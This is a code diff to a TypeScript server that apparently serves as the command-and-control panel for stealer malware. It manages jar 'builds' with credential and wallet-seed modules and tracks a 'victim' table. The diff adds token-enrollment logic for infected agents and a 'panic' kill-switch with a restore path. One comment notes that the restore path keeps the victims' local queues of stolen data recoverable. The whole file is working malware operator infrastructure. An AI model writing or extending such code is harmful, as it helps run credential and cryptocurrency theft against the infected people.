@@ -8,7 +8,8 @@ import { env } from '../lib/env';
 import { audit } from '../lib/audit';
 import { bad, HttpError, notFound } from '../lib/errors';
 import { requireRole } from '../plugins/auth';
-import { buildToken } from '../lib/crypto';
+import { publish } from '../lib/bus';
+import { buildToken, enrollTokenV2, openBuildSecret } from '../lib/crypto';
 import { createBuild, injectConfig, type BuildConfig } from '../services/build';
 
 const createSchema = z.object({
@@ -22,7 +23,8 @@ const createSchema = z.object({
     credentials: z.boolean().default(true),
     seeds: z.boolean().default(true)
   }).optional(),
-  crack: z.boolean().optional()
+  crack: z.boolean().optional(),
+  enroll_grace_hours: z.number().int().min(0).max(168).default(24)
 });
 
 export const buildRoutes: FastifyPluginAsync = async (app) => {
@@ -39,7 +41,9 @@ export const buildRoutes: FastifyPluginAsync = async (app) => {
         profile: build.profile,
         universal: build.universal,
         buildId: build.buildId,
-        token: buildToken(build.secret),
+        token: build.enrollScheme === 2
+          ? enrollTokenV2(openBuildSecret(build.secret), build.buildId)
+          : buildToken(build.secret),
         status: build.status,
         jarPath: build.jarPath,
         createdBy: build.createdBy?.email ?? null,
@@ -52,7 +56,7 @@ export const buildRoutes: FastifyPluginAsync = async (app) => {
 
   app.post('/builds', { preHandler: requireRole('admin') }, async (request, reply) => {
     const input = createSchema.parse(request.body);
-    const created = await createBuild({ ...input, operatorId: request.operator!.id, modules: input.modules, crack: input.crack });
+    const created = await createBuild({ ...input, operatorId: request.operator!.id, modules: input.modules, crack: input.crack, enrollGraceHours: input.enroll_grace_hours });
     await audit(prisma, { operatorId: request.operator?.id, action: 'build.create', entity: 'build', entityId: created.id, ip: request.clientIp, data: { name: input.name, version: input.version, profile: input.profile } });
     return reply.code(201).send({ id: created.id, buildId: created.buildId, token: created.token, config: created.config });
   });
@@ -92,11 +96,62 @@ export const buildRoutes: FastifyPluginAsync = async (app) => {
     return reply.send(createReadStream(build.jarPath));
   });
 
+
+  /** Kill-switch: every agent gets 410 on the next heartbeat cycle. */
+  app.post('/panic', { preHandler: requireRole('admin') }, async (request) => {
+    const dry = (request.query as { dry_run?: string }).dry_run === '1';
+    const where = { revokedAt: null };
+    if (dry) {
+      const [builds, victims] = await Promise.all([
+        prisma.build.count({ where }),
+        prisma.victim.count({ where })
+      ]);
+      return { ok: true, dry_run: true, builds, victims };
+    }
+    const now = new Date();
+    const result = await prisma.$transaction(async (tx) => {
+      const builds = await tx.build.updateMany({ where, data: { status: 'revoked', revokedAt: now } });
+      // Tokens are cleared, but salt and epoch stay: a re-enroll can still open
+      // the local queue once the build is restored.
+      const victims = await tx.victim.updateMany({
+        where,
+        data: {
+          status: 'revoked',
+          revokedAt: now,
+          identityState: 'revoked',
+          graceUntil: null,
+          prevTokenEnc: null,
+          prevTokenExpiresAt: null,
+          pendingTokenEnc: null,
+          pendingTokenExpiresAt: null
+        }
+      });
+      await audit(tx, { operatorId: request.operator?.id, action: 'panic', entity: 'build', ip: request.clientIp,
+        data: { builds: builds.count, victims: victims.count } });
+      return { builds: builds.count, victims: victims.count };
+    });
+    void publish({ type: 'panic', at: Date.now(), data: { builds: result.builds, victims: result.victims } });
+    return { ok: true, builds: result.builds, victims: result.victims };
+  });
+
+  app.post('/panic/restore', { preHandler: requireRole('admin') }, async (request) => {
+    const result = await prisma.$transaction(async (tx) => {
+      const builds = await tx.build.updateMany({ where: { status: 'revoked' }, data: { status: 'ready', revokedAt: null } });
+      const victims = await tx.victim.updateMany({ where: { status: 'revoked' }, data: { status: 'offline', revokedAt: null } });
+      await audit(tx, { operatorId: request.operator?.id, action: 'panic.restore', entity: 'build', ip: request.clientIp,
+        data: { builds: builds.count, victims: victims.count } });
+      return { builds: builds.count, victims: victims.count };
+    });
+    return { ok: true, builds: result.builds, victims: result.victims, restore_only_reopens_enrollment: true };
+  });
+
   app.post('/builds/:id/revoke', { preHandler: requireRole('admin') }, async (request) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
-    await prisma.build.update({ where: { id }, data: { status: 'revoked', revokedAt: new Date() } });
-    await prisma.victim.updateMany({ where: { buildId: id }, data: { status: 'revoked', revokedAt: new Date() } });
-    await audit(prisma, { operatorId: request.operator?.id, action: 'build.revoke', entity: 'build', entityId: id, ip: request.clientIp });
+    await prisma.$transaction(async (tx) => {
+      await tx.build.update({ where: { id }, data: { status: 'revoked', revokedAt: new Date() } });
+      await tx.victim.updateMany({ where: { buildId: id }, data: { status: 'revoked', revokedAt: new Date() } });
+      await audit(tx, { operatorId: request.operator?.id, action: 'build.revoke', entity: 'build', entityId: id, ip: request.clientIp });
+    });
     return { ok: true };
   });
 
